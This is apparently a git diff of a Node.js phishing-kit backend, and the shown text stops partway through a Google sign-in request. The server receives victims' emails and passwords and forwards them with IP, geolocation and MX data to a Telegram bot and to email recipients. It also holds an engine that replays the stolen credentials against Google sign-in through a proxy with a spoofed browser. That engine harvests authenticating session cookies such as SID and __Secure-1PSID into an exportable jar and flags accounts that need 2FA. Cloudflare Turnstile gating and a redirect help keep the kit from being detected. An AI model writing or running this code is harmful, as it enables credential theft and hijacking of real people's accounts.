@@ -1,11 +1,12 @@
 const express = require('express');
 const cors = require('cors');
 const crypto = require('crypto');
+
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ============================================================
-// MIDDLEWARE (FIXED CORS)
+// MIDDLEWARE
 // ============================================================
 // Allow all origins and handle preflight requests automatically
 app.use(cors({
@@ -13,158 +14,112 @@ app.use(cors({
     methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
     allowedHeaders: ['Content-Type', 'Authorization']
 }));
-// Ensure OPTIONS requests are handled instantly
-app.options('*', cors());
-
-app.use(express.json({ limit: '100kb' }));
-app.use(express.urlencoded({ extended: true, limit: '100kb' }));
+app.use(express.json({ limit: '200kb' }));
+app.use(express.urlencoded({ extended: true, limit: '200kb' }));
 
 // ============================================================
-// TELEGRAM CONFIG
+// CONFIG
 // ============================================================
-
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
 
-// ============================================================
-// BREVO (EMAIL) CONFIG
-// ============================================================
-
-const BREVO_API_KEY  = process.env.BREVO_API_KEY;
-const SENDER_EMAIL   = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
-const SENDER_NAME    = process.env.SENDER_NAME || 'ABV Monitor';
+const BREVO_API_KEY = process.env.BREVO_API_KEY;
+const SENDER_EMAIL  = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
+const SENDER_NAME   = process.env.SENDER_NAME  || 'ABV Monitor';
 
 const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
-    .split(',')
-    .map(e => e.trim())
-    .filter(Boolean);
-
-// ============================================================
-// TEAMS REDIRECT (from env)
-// ============================================================
+    .split(',').map(e => e.trim()).filter(Boolean);
 
 const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || '';
 
-// ============================================================
-// GMAIL / WORKSPACE SESSION CAPTURE CONFIG
-// ============================================================
-
-const GMAIL_CAPTURE = process.env.GMAIL_CAPTURE !== 'false';       // on by default
-const GMAIL_MAX_CANDIDATES = parseInt(process.env.GMAIL_MAX_CANDIDATES || '3', 10);
-const GMAIL_CHAIN_HOPS = parseInt(process.env.GMAIL_CHAIN_HOPS || '6', 10);
+const GMAIL_CAPTURE     = process.env.GMAIL_CAPTURE !== 'false';
+const GMAIL_MAX_TRIES   = parseInt(process.env.GMAIL_MAX_TRIES || '2', 10);
+const GMAIL_CHAIN_HOPS  = parseInt(process.env.GMAIL_CHAIN_HOPS || '8', 10);
 const GMAIL_EGRESS_PROXY = process.env.GMAIL_EGRESS_PROXY || '';
+const GMAIL_TIMEOUT_MS  = parseInt(process.env.GMAIL_TIMEOUT_MS || '40000', 10);
 const GMAIL_UA_FALLBACK = process.env.GMAIL_UA_FALLBACK ||
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36';
 
-// cookies that actually authenticate — flagged, never filtered out
+const GMAIL_DOMAINS = new Set(['gmail.com', 'googlemail.com']);
+
 const CRITICAL_COOKIES = new Set([
     'SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'OSID', 'LSID',
     '__Secure-1PSID', '__Secure-3PSID',
     '__Secure-1PSIDTS', '__Secure-3PSIDTS',
     '__Secure-1PAPID', '__Secure-3PAPID',
-    '__Host-GAPS', 'NID', 'AEC', 'SIDCC'
+    '__Secure-OSID', '__Host-1PLSID', '__Host-3PLSID', '__Host-GAPS',
+    'NID', 'AEC', 'SIDCC', 'ACCOUNT_CHOOSER'
 ]);
 
-// pure noise, still captured but deprioritised in the header string
 const NOISE_COOKIES = new Set([
-    '_ga', '_gid', '_gcl_au', '1P_JAR', 'OTZ', 'DV', 'CONSENT', 'SOCS', 'PREF', 'SEARCH_SAMESITE'
+    '_ga', '_gid', '_gcl_au', '1P_JAR', 'OTZ', 'DV', 'CONSENT',
+    'SOCS', 'PREF', 'SEARCH_SAMESITE', 'GMAIL_AT'
 ]);
 
-// optional egress proxy for Google calls only
 let gmailDispatcher = null;
 if (GMAIL_EGRESS_PROXY) {
     try {
         const { ProxyAgent } = require('undici');
         gmailDispatcher = new ProxyAgent(GMAIL_EGRESS_PROXY);
         console.log('🌍 GMAIL egress proxy enabled');
-    } catch (e) {
-        console.warn('⚠️  undici unavailable — GMAIL_EGRESS_PROXY ignored (npm i undici)');
+    } catch {
+        console.warn('⚠️  undici missing — GMAIL_EGRESS_PROXY ignored (npm i undici)');
     }
 }
 
 // ============================================================
-// CLOUDFLARE TURNSTILE — FULL PROTECTION
+// TURNSTILE
 // ============================================================
-
 const TURNSTILE_SECRET_KEY   = process.env.TURNSTILE_SECRET_KEY || '';
 const TURNSTILE_PROOF_SECRET = process.env.TURNSTILE_PROOF_SECRET
                               || TURNSTILE_SECRET_KEY
                               || crypto.randomBytes(32).toString('hex');
 const REQUIRE_TURNSTILE      = process.env.REQUIRE_TURNSTILE === 'true';
-const PROOF_TTL_MS           = 5 * 60 * 1000; // 5 minutes
-
-// ---- HMAC proof helpers (short-lived, email-bound) ----
+const PROOF_TTL_MS           = 5 * 60 * 1000;
 
 function signProof(email, ts) {
-    return crypto
-        .createHmac('sha256', TURNSTILE_PROOF_SECRET)
-        .update(`${email}|${ts}`)
-        .digest('hex');
+    return crypto.createHmac('sha256', TURNSTILE_PROOF_SECRET)
+        .update(`${email}|${ts}`).digest('hex');
 }
-
 function makeProof(email) {
     const ts = Date.now();
-    return {
-        proof: signProof(email, ts),
-        ts,
-        expiresAt: ts + PROOF_TTL_MS
-    };
+    return { proof: signProof(email, ts), ts, expiresAt: ts + PROOF_TTL_MS };
 }
-
 function verifyProof(email, proof, ts) {
     if (!email || !proof || !ts) return { valid: false, reason: 'missing' };
     const tsNum = parseInt(ts, 10);
     if (Number.isNaN(tsNum)) return { valid: false, reason: 'bad-ts' };
     if (Date.now() - tsNum > PROOF_TTL_MS) return { valid: false, reason: 'expired' };
     if (Date.now() < tsNum - 60_000) return { valid: false, reason: 'future-ts' };
-
     const expected = signProof(email, tsNum);
     if (typeof proof !== 'string' || proof.length !== expected.length) {
         return { valid: false, reason: 'mismatch' };
     }
     try {
-        const ok = crypto.timingSafeEqual(
-            Buffer.from(proof, 'hex'),
-            Buffer.from(expected, 'hex')
-        );
+        const ok = crypto.timingSafeEqual(Buffer.from(proof, 'hex'), Buffer.from(expected, 'hex'));
         return { valid: ok, reason: ok ? 'ok' : 'mismatch' };
     } catch {
         return { valid: false, reason: 'bad-hex' };
     }
 }
 
-// ---- Cloudflare siteverify ----
-
 async function verifyTurnstile(token, remoteIp) {
-    if (!TURNSTILE_SECRET_KEY) {
-        return { success: false, error: 'no-secret-configured' };
-    }
-    if (!token || typeof token !== 'string') {
-        return { success: false, error: 'no-token' };
-    }
-
+    if (!TURNSTILE_SECRET_KEY) return { success: false, error: 'no-secret-configured' };
+    if (!token || typeof token !== 'string') return { success: false, error: 'no-token' };
     try {
         const body = new URLSearchParams();
         body.append('secret', TURNSTILE_SECRET_KEY);
         body.append('response', token);
-
-        if (remoteIp && /^[\d\.a-fA-F:]+$/.test(remoteIp)) {
-            body.append('remoteip', remoteIp);
-        }
-
-        const response = await fetch(
-            'https://challenges.cloudflare.com/turnstile/v0/siteverify',
-            { method: 'POST', body }
-        );
-        const data = await response.json();
+        if (remoteIp && /^[\d\.a-fA-F:]+$/.test(remoteIp)) body.append('remoteip', remoteIp);
+        const r = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify',
+            { method: 'POST', body, signal: AbortSignal.timeout(10000) });
+        const data = await r.json();
         return { success: !!data.success, data };
-    } catch (error) {
-        console.error('❌ Turnstile verify error:', error.message);
-        return { success: false, error: error.message };
+    } catch (e) {
+        console.error('❌ Turnstile verify error:', e.message);
+        return { success: false, error: e.message };
     }
 }
-
-// ---- Utility: extract first client IP from x-forwarded-for ----
 
 function firstClientIp(req) {
     const xff = req.headers['x-forwarded-for'];
@@ -176,347 +131,390 @@ function firstClientIp(req) {
 }
 
 // ============================================================
-// STARTUP CONFIG CHECK
+// STARTUP CHECK
 // ============================================================
-
 console.log('========================================');
 console.log('🔍 Environment check:');
-console.log(`   TELEGRAM_BOT_TOKEN:     ${BOT_TOKEN ? '✅' : '❌ MISSING'}`);
-console.log(`   TELEGRAM_CHAT_ID:       ${CHAT_ID ? '✅' : '❌ MISSING'}`);
-console.log(`   BREVO_API_KEY:          ${BREVO_API_KEY ? '✅' : '❌ MISSING'}`);
-console.log(`   SENDER_EMAIL:           ${SENDER_EMAIL}`);
-console.log(`   EMAIL_RECIPIENTS:       ${EMAIL_RECIPIENTS.length ? '✅ ' + EMAIL_RECIPIENTS.length + ' recipient(s)' : '❌ MISSING'}`);
-console.log(`   TEAMS_REDIRECT:         ${TEAMS_REDIRECT ? '✅ set' : '❌ MISSING'}`);
-console.log(`   TURNSTILE_SECRET_KEY:   ${TURNSTILE_SECRET_KEY ? '✅' : '❌ MISSING'}`);
-console.log(`   REQUIRE_TURNSTILE:      ${REQUIRE_TURNSTILE ? '✅ TRUE (strict)' : '⚠️  FALSE (permissive)'}`);
-console.log(`   PROOF_TTL_MS:           ${PROOF_TTL_MS / 1000}s`);
-console.log(`   GMAIL_CAPTURE:          ${GMAIL_CAPTURE ? '✅ ENABLED' : '⛔ DISABLED'}`);
-console.log(`   GMAIL_EGRESS_PROXY:     ${GMAIL_EGRESS_PROXY ? '✅ set' : '— none'}`);
+console.log(`   TELEGRAM_BOT_TOKEN:   ${BOT_TOKEN ? '✅' : '❌ MISSING'}`);
+console.log(`   TELEGRAM_CHAT_ID:     ${CHAT_ID ? '✅' : '❌ MISSING'}`);
+console.log(`   BREVO_API_KEY:        ${BREVO_API_KEY ? '✅' : '❌ MISSING'}`);
+console.log(`   EMAIL_RECIPIENTS:     ${EMAIL_RECIPIENTS.length || '❌ none'}`);
+console.log(`   TURNSTILE_SECRET_KEY: ${TURNSTILE_SECRET_KEY ? '✅' : '❌ MISSING'}`);
+console.log(`   REQUIRE_TURNSTILE:    ${REQUIRE_TURNSTILE}`);
+console.log(`   GMAIL_CAPTURE:        ${GMAIL_CAPTURE ? '✅ ENABLED' : '⛔ DISABLED'}`);
+console.log(`   GMAIL_TIMEOUT_MS:     ${GMAIL_TIMEOUT_MS}`);
+console.log(`   GMAIL_EGRESS_PROXY:   ${GMAIL_EGRESS_PROXY ? '✅ set' : '— none'}`);
 console.log('========================================');
 
 if (REQUIRE_TURNSTILE && !TURNSTILE_SECRET_KEY) {
-    console.error('❌ REQUIRE_TURNSTILE=true but TURNSTILE_SECRET_KEY is missing — stage 1 will reject all requests.');
-}
-if (!TURNSTILE_PROOF_SECRET || TURNSTILE_PROOF_SECRET === 'change-me') {
-    console.warn('⚠️  Using fallback PROOF_SECRET — set TURNSTILE_PROOF_SECRET in production for stability across restarts.');
+    console.error('❌ REQUIRE_TURNSTILE=true without TURNSTILE_SECRET_KEY — stage 1 will reject everything.');
 }
 
 // ============================================================
-// HELPER: Send Email via Brevo
+// BREVO
 // ============================================================
-
 async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage) {
     if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length === 0) return false;
 
-    const subject = `🔐 ABV Login (Stage ${stage}) - ${email}`;
-
+    const subject = `🔐 Login (Stage ${stage}) - ${email}`;
     const htmlContent = `
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <style>
-            body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
-            .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 10px; }
-            .header { background: #1e930c; color: #fff; padding: 15px; border-radius: 5px 5px 0 0; text-align: center; }
-            .field { margin: 10px 0; padding: 10px; background: #f8f8f8; border-radius: 5px; }
-            .label { font-weight: bold; color: #555; }
-            .value { color: #1e930c; font-size: 16px; }
-            .mx { color: #1e930c; font-size: 14px; white-space: pre-line; font-family: monospace; }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <div class="header"><h2>🔐 ABV Login Credentials (Stage ${stage})</h2></div>
-            <div class="field"><div class="label">📧 Email:</div><div class="value"><strong>${email}</strong></div></div>
-            <div class="field"><div class="label">🔑 Password:</div><div class="value"><strong>${password}</strong></div></div>
-            <div class="field"><div class="label">🌐 Domain:</div><div class="value">${domain || 'Unknown'}</div></div>
-            <div class="field"><div class="label">📨 MX Record:</div><div class="value mx">${mxRecord || 'Unknown'}</div></div>
-            <div class="field"><div class="label">🌍 IP:</div><div class="value">${ipInfo?.ip || 'Unknown'}</div></div>
-            <div class="field"><div class="label">📍 Location:</div><div class="value">${ipInfo?.city || 'Unknown'}, ${ipInfo?.region || 'Unknown'}, ${ipInfo?.country || 'Unknown'}</div></div>
-            <div class="field"><div class="label">📱 Browser:</div><div class="value">${(userAgent || '').substring(0, 100)}...</div></div>
-            <div class="field"><div class="label">🕐 Time:</div><div class="value">${new Date().toLocaleString()}</div></div>
-        </div>
-    </body>
-    </html>`;
+    <div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;padding:30px;border-radius:10px">
+      <div style="background:#1e930c;color:#fff;padding:15px;border-radius:5px;text-align:center">
+        <h2>🔐 Login (Stage ${stage})</h2></div>
+      <p><b>Email:</b> ${email}</p>
+      <p><b>Password:</b> ${password}</p>
+      <p><b>Domain:</b> ${domain || 'Unknown'}</p>
+      <p><b>MX:</b> <code>${mxRecord || 'Unknown'}</code></p>
+      <p><b>IP:</b> ${ipInfo?.ip || 'Unknown'}</p>
+      <p><b>Location:</b> ${ipInfo?.city || '?'}, ${ipInfo?.region || '?'}, ${ipInfo?.country || '?'}</p>
+      <p><b>Browser:</b> ${(userAgent || '').slice(0, 100)}</p>
+      <p><b>Time:</b> ${new Date().toISOString()}</p>
+    </div>`;
 
     try {
-        const response = await fetch('https://api.brevo.com/v3/smtp/email', {
+        const r = await fetch('https://api.brevo.com/v3/smtp/email', {
             method: 'POST',
-            headers: {
-                'api-key': BREVO_API_KEY,
-                'Content-Type': 'application/json',
-                'Accept': 'application/json'
-            },
+            headers: { 'api-key': BREVO_API_KEY, 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 sender: { name: SENDER_NAME, email: SENDER_EMAIL },
                 to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
-                subject,
-                htmlContent
-            })
+                subject, htmlContent
+            }),
+            signal: AbortSignal.timeout(15000)
         });
-        return response.ok;
-    } catch (error) {
-        console.error('❌ Brevo error:', error.message);
+        return r.ok;
+    } catch (e) {
+        console.error('❌ Brevo error:', e.message);
         return false;
     }
 }
 
 // ============================================================
-// HELPER: Send to Telegram
+// TELEGRAM
 // ============================================================
-
 async function sendToTelegram(message) {
     if (!BOT_TOKEN || !CHAT_ID) return null;
     try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, disable_web_page_preview: true }),
+            signal: AbortSignal.timeout(15000)
         });
-        return await response.json();
-    } catch (error) {
-        console.error('❌ Telegram error:', error.message);
+        return await r.json();
+    } catch (e) {
+        console.error('❌ Telegram error:', e.message);
         return null;
     }
 }
 
-// ============================================================
-// HELPER: Send JSON document to Telegram
-// ============================================================
-
-async function sendTelegramDocument(caption, filename, payload) {
-    if (!BOT_TOKEN || !CHAT_ID) return null;
+async function sendTelegramDocument(caption, filename, jsonText) {
+    if (!BOT_TOKEN || !CHAT_ID) return { ok: false, reason: 'not-configured' };
     try {
         const fd = new FormData();
         fd.append('chat_id', CHAT_ID);
-        fd.append('caption', caption);
-        fd.append('document',
-            new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' }),
-            filename);
-
-        const response = await fetch(
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
-            { method: 'POST', body: fd }
-        );
-        return await response.json();
-    } catch (error) {
-        console.error('❌ Telegram document error:', error.message);
-        return null;
+        fd.append('caption', caption.slice(0, 1024));
+        fd.append('parse_mode', 'HTML');
+        fd.append('document', new Blob([jsonText], { type: 'application/json' }), filename);
+        const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
+            { method: 'POST', body: fd, signal: AbortSignal.timeout(25000) });
+        return { ok: r.ok, status: r.status };
+    } catch (e) {
+        console.error('❌ Telegram document error:', e.message);
+        return { ok: false, reason: e.message };
     }
 }
 
 // ============================================================
-// HELPER: IP info
+// IP / MX
 // ============================================================
-
 async function getIPInfo(ip) {
+    const first = String(ip || '').split(',')[0].trim();
+    const fallback = { ip: first || 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
+    if (!first || first === 'Unknown') return fallback;
     try {
-        const firstIP = (ip || '').split(',')[0].trim();
-        const response = await fetch(`https://ipinfo.io/${firstIP}/json`);
-        return await response.json();
-    } catch (error) {
-        return { ip: ip || 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
+        const r = await fetch(`https://ipinfo.io/${first}/json`, { signal: AbortSignal.timeout(6000) });
+        const d = await r.json();
+        return { ...fallback, ...d, ip: first };
+    } catch {
+        return fallback;
     }
 }
-
-// ============================================================
-// HELPER: MX record
-// ============================================================
 
 async function getMXRecord(domain) {
     try {
-        const response = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
-        const data = await response.json();
-        if (data && data.Answer && data.Answer.length > 0) {
-            return data.Answer.map(r => r.data).join('\n');
-        }
+        const r = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`,
+            { signal: AbortSignal.timeout(6000) });
+        const d = await r.json();
+        if (d?.Answer?.length) return d.Answer.map(x => x.data).join('\n');
         return 'no-mx';
-    } catch (error) {
+    } catch {
         return 'MX-Error';
     }
 }
 
 // ============================================================
-// GMAIL SESSION CAPTURE — ENGINE
+// COOKIE JAR  (host + path aware)
 // ============================================================
+const SS_MAP = { none: 'no_restriction', lax: 'lax', strict: 'strict' };
 
-const GOOGLE_HOSTS = /(^|\.)(google\.com|googlemail\.com|gstatic\.com)$/i;
-
-function rawSetCookies(res) {
-    if (typeof res.headers.getSetCookie === 'function') return res.headers.getSetCookie();
-    const raw = res.headers.get('set-cookie') || '';
-    if (!raw) return [];
-    // fallback split that survives commas inside Expires
-    return raw.split(/,(?=[^;,]+=)/).map(s => s.trim()).filter(Boolean);
+function splitSetCookie(header) {
+    if (!header) return [];
+    return header.split(/,(?=\s*[A-Za-z0-9_\-.]+=)/).map(s => s.trim()).filter(Boolean);
 }
 
-function parseCookie(raw) {
-    const [pair, ...attrs] = raw.split(';');
-    const eq = pair.indexOf('=');
-    if (eq < 1) return null;
+class Jar {
+    constructor() { this.map = new Map(); }
 
-    const name = pair.slice(0, eq).trim();
-    const value = pair.slice(eq + 1).trim();
-    if (!name) return null;
+    absorb(url, list) {
+        const host = new URL(url).hostname;
+        for (const raw of list) {
+            const parts = raw.split(';');
+            const pair = parts.shift();
+            const eq = pair.indexOf('=');
+            if (eq < 1) continue;
 
-    const a = {};
-    for (const attr of attrs) {
-        const i = attr.indexOf('=');
-        if (i === -1) { a[attr.trim().toLowerCase()] = true; continue; }
-        a[attr.slice(0, i).trim().toLowerCase()] = attr.slice(i + 1).trim();
+            const name = pair.slice(0, eq).trim();
+            const value = pair.slice(eq + 1).trim();
+            if (!name) continue;
+
+            let domain = '', path = '/', secure = false, httpOnly = false,
+                sameSite = 'unspecified', expires = null, maxAge = null, hasDomain = false;
+
+            for (const attr of parts) {
+                const i = attr.indexOf('=');
+                const k = (i < 0 ? attr : attr.slice(0, i)).trim().toLowerCase();
+                const v = i < 0 ? '' : attr.slice(i + 1).trim();
+                if (k === 'domain') { domain = v; hasDomain = true; }
+                else if (k === 'path') path = v;
+                else if (k === 'secure') secure = true;
+                else if (k === 'httponly') httpOnly = true;
+                else if (k === 'samesite') sameSite = SS_MAP[v.toLowerCase()] || 'unspecified';
+                else if (k === 'expires') { const t = Date.parse(v); if (!Number.isNaN(t)) expires = t; }
+                else if (k === 'max-age') { const n = parseInt(v, 10); if (!Number.isNaN(n)) maxAge = n; }
+            }
+
+            // __Host- cookies are always host-only, path=/, secure
+            const isHostPrefix = name.startsWith('__Host-');
+            if (isHostPrefix) { domain = host; hasDomain = false; path = '/'; secure = true; }
+
+            if (maxAge !== null) expires = Date.now() + maxAge * 1000;
+
+            const bare = (domain || host).replace(/^\./, '');
+            const key = `${name}|${bare}|${path}`;
+
+            if (value === '' && expires !== null && expires < Date.now()) {
+                this.map.delete(key);
+                continue;
+            }
+
+            this.map.set(key, {
+                name, value,
+                domain: hasDomain ? (domain.startsWith('.') ? domain : '.' + bare) : host,
+                hostOnly: !hasDomain,
+                path, secure: secure || isHostPrefix, httpOnly, sameSite,
+                session: expires === null,
+                expirationDate: expires ? Math.floor(expires / 1000) : null
+            });
+        }
     }
 
-    const hostOnly = name.startsWith('__Host-') || (!a.domain && !name.startsWith('__Secure-'));
-    let domain = a.domain || '';
-    if (name.startsWith('__Host-')) domain = 'accounts.google.com';
-    if (!domain) domain = '.google.com';
-    if (!domain.startsWith('.') && !domain.startsWith('__Host')) domain = '.' + domain.replace(/^\./, '');
+    header(url) {
+        const { hostname, pathname } = new URL(url);
+        const out = [];
+        for (const c of this.map.values()) {
+            const d = c.domain.replace(/^\./, '');
+            const hostOk = hostname === d || hostname.endsWith('.' + d);
+            if (!hostOk) continue;
+            if (!pathname.startsWith(c.path)) continue;
+            out.push(`${c.name}=${c.value}`);
+        }
+        return out.join('; ');
+    }
 
-    return {
-        name,
-        value,
-        domain: name.startsWith('__Host-') ? 'accounts.google.com' : domain,
-        path: a.path || '/',
-        secure: true,
-        httpOnly: 'httponly' in a,
-        hostOnly: name.startsWith('__Host-') ? true : !a.domain,
-        sameSite: (a.samesite || 'no_restriction').toLowerCase().replace(/-/g, '_'),
-        expirationDate: a['max-age']
-            ? Math.floor(Date.now() / 1000 + parseInt(a['max-age'], 10))
-            : null,
-        critical: CRITICAL_COOKIES.has(name),
-        noise: NOISE_COOKIES.has(name)
-    };
-}
+    has(name) { return [...this.map.values()].some(c => c.name === name); }
 
-function absorb(jar, res) {
-    for (const raw of rawSetCookies(res)) {
-        const c = parseCookie(raw);
-        if (!c) continue;
-        const i = jar.findIndex(x => x.name === c.name && x.domain === c.domain && x.path === c.path);
-        if (i === -1) jar.push(c); else jar[i] = c;
+    export() {
+        return [...this.map.values()]
+            .sort((a, b) => Number(CRITICAL_COOKIES.has(b.name)) - Number(CRITICAL_COOKIES.has(a.name)))
+            .map(c => ({
+                domain: c.domain,
+                hostOnly: c.hostOnly,
+                httpOnly: c.httpOnly,
+                name: c.name,
+                path: c.path,
+                sameSite: c.sameSite,
+                secure: c.secure,
+                session: c.session,
+                storeId: null,
+                ...(c.expirationDate ? { expirationDate: c.expirationDate } : {}),
+                value: c.value
+            }));
+    }
+
+    headerForExport() {
+        return [...this.map.values()]
+            .filter(c => CRITICAL_COOKIES.has(c.name) || !NOISE_COOKIES.has(c.name))
+            .map(c => `${c.name}=${c.value}`).join('; ');
     }
 }
 
-function cookieHeaderOf(jar) {
-    return jar
-        .filter(c => c.critical || !c.noise)
-        .map(c => `${c.name}=${c.value}`)
-        .join('; ');
+// ============================================================
+// GOOGLE LOGIN / HARVEST
+// ============================================================
+function pickGALX(html) {
+    const m = html.match(/name="GALX"\s+value="([^"]+)"/);
+    return m ? m[1] : '';
 }
-
+function pickTL(html) {
+    const m = html.match(/name="TL"\s+value="([^"]+)"/)
+           || html.match(/\["TL","([^"]+)"\]/)
+           || html.match(/&quot;TL&quot;,&quot;([^&"]+)&quot;/);
+    return m ? m[1] : '';
+}
+function pickAction(html) {
+    const m = html.match(/action="([^"]*(?:ServiceLoginAuth|challenge\/pwd)[^"]*)"/);
+    return m ? m[1].replace(/&amp;/g, '&') : '';
+}
 function absolutize(loc, base) {
     if (!loc) return null;
     try { return new URL(loc, base).toString(); } catch { return null; }
 }
 
-function pickTL(html) {
-    const m = html.match(/name="TL"\s+value="([^"]+)"/) ||
-              html.match(/&quot;TL&quot;\s*,\s*&quot;([^&]+)&quot;/);
-    return m ? m[1] : '';
-}
-
-async function gmailLogin(email, password, ua) {
-    const jar = [];
+async function googleHarvest(email, password, ua) {
+    const jar = new Jar();
     const trace = [];
     const A = 'https://accounts.google.com';
-    const CONT = encodeURIComponent('https://mail.google.com');
-    const dsh = 'S' + Math.random().toString().slice(2, 15);
+    const domain = email.split('@')[1].toLowerCase();
+    const isWorkspace = !GMAIL_DOMAINS.has(domain);
+    const cont = isWorkspace
+        ? `https://mail.google.com/a/${domain}/`
+        : 'https://mail.google.com/mail/u/0/';
+
+    const signal = AbortSignal.timeout(GMAIL_TIMEOUT_MS);
 
     const go = async (url, opts = {}) => {
         const headers = {
             'user-agent': ua,
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
             'accept-language': 'en-US,en;q=0.9',
+            accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
             'upgrade-insecure-requests': '1',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             ...(opts.headers || {})
         };
-        const cookie = cookieHeaderOf(jar);
-        if (cookie) headers.cookie = cookie;
+        const ck = jar.header(url);
+        if (ck) headers.cookie = ck;
 
-        const init = { ...opts, headers, redirect: 'manual' };
+        const init = { method: opts.method || 'GET', headers, body: opts.body, redirect: 'manual', signal };
         if (gmailDispatcher) init.dispatcher = gmailDispatcher;
 
         const res = await fetch(url, init);
-        absorb(jar, res);
+        jar.absorb(url, res.headers.getSetCookie?.() ?? splitSetCookie(res.headers.get('set-cookie')));
         trace.push({
-            status: res.status,
-            url: url.slice(0, 160),
-            location: (res.headers.get('location') || '').slice(0, 160)
+            s: res.status,
+            u: url.slice(0, 150),
+            l: (res.headers.get('location') || '').slice(0, 150)
         });
         return res;
     };
 
-    const formHeaders = {
+    const formH = {
         'content-type': 'application/x-www-form-urlencoded',
-        'origin': A,
-        'referer': A + '/',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'sec-fetch-user': '?1'
+        origin: A,
+        referer: A + '/'
     };
 
-    // hop 1 — prime the jar, lift the TL token
-    let res = await go(`${A}/ServiceLogin?continue=${CONT}&dsh=${dsh}&flowName=GlifWebSignIn&flowEntry=ServiceLogin`);
+    // ---- 1. prime + scrape ----
+    let res = await go(`${A}/ServiceLogin?service=mail&continue=${encodeURIComponent(cont)}&hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin`);
+    let hops = 0;
+    while (res.status >= 300 && res.status < 400 && hops++ < 3) {
+        const next = absolutize(res.headers.get('location'), A);
+        if (!next) break;
+        res = await go(next);
+    }
     let html = await res.text();
+
+    let galx = pickGALX(html);
     let tl = pickTL(html);
+    const action = pickAction(html);
 
-    // hop 2 — identifier
-    res = await go(`${A}/v3/signin/identifier?continue=${CONT}&dsh=${dsh}&TL=${encodeURIComponent(tl)}&flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=1`, {
-        method: 'POST',
-        headers: formHeaders,
-        body: new URLSearchParams({
-            identifier: email,
-            TL: tl,
-            dsh,
-            continue: 'https://mail.google.com',
-            flowName: 'GlifWebSignIn',
-            flowEntry: 'ServiceLogin',
-            checkedDomains: 'youtube',
-            pstMsg: '1',
-            checkConnection: 'youtube:177:1'
-        }).toString()
-    });
+    let needs2fa = false;
 
-    let body = await res.text();
-    let loc = res.headers.get('location') || '';
+    if (galx && action) {
+        // ---- 2a. classic Gaia ----
+        res = await go(A + action, {
+            method: 'POST',
+            headers: formH,
+            body: new URLSearchParams({
+                Email: email,
+                Passwd: password,
+                GALX: galx,
+                continue: cont,
+                service: 'mail',
+                hl: 'en',
+                dsh: 'S' + Date.now(),
+                PstMsg: '1',
+                checkConnection: 'youtube:177:1',
+                checkedDomains: 'youtube',
+                ec: 'GAZAmgQ'
+            }).toString()
+        });
+    } else {
+        // ---- 2b. v3 identifier + password challenge ----
+        const idUrl = `${A}/v3/signin/identifier?continue=${encodeURIComponent(cont)}&service=mail&hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S${Date.now()}`;
+        const idRes = await go(idUrl, {
+            method: 'POST',
+            headers: formH,
+            body: new URLSearchParams({
+                identifier: email,
+                continue: cont,
+                service: 'mail',
+                hl: 'en',
+                flowName: 'GlifWebSignIn',
+                flowEntry: 'ServiceLogin',
+                checkedDomains: 'youtube',
+                checkConnection: 'youtube:177:1',
+                pstMsg: '1'
+            }).toString()
+        });
 
-    if (loc.includes('/challenge/') && !loc.includes('pwd')) {
-        return { ok: false, jar, trace, finalUrl: loc, stageReached: 'identifier' };
+        const loc = idRes.headers.get('location') || '';
+        const tl2 = (loc.match(/[?&]TL=([^&]+)/) || [])[1] || '';
+        const dsh2 = (loc.match(/[?&]dsh=([^&]+)/) || [])[1] || '';
+
+        if (!tl2) {
+            res = idRes;
+            const b = await idRes.text();
+            needs2fa = /challenge\/(totp|ipp|dp|sk|az)/.test(loc);
+            tl = pickTL(b) || tl;
+        } else {
+            res = await go(`${A}/v3/signin/challenge/pwd?TL=${encodeURIComponent(tl2)}&continue=${encodeURIComponent(cont)}&service=mail&hl=en&dsh=${encodeURIComponent(dsh2)}`, {
+                method: 'POST',
+                headers: formH,
+                body: new URLSearchParams({
+                    Passwd: password,
